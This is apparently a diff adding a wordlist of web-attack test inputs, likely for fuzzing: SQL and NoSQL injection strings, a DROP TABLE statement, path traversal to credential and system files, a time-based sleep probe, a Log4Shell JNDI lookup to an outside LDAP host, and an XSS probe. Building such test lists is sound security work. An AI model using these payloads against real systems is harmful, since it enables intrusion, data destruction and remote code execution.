@@ -1,0 +1,21 @@
+' OR '1'='1
+") or 1=1 --
+")) or 1=1 --
+admin' --
+" OR "" = "
+{"$ne": ""}
+{"$gt": ""}
+{"$or": [{"a":1},{"b":1}]}
+../../etc/passwd
+..\\..\\windows\\win.ini
+; DROP TABLE users;
+sleep(5)
+${jndi:ldap://example.com/a}
+<script>alert(1)</script>
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3C%3E%27%22
+%00
+[]
+{}
+
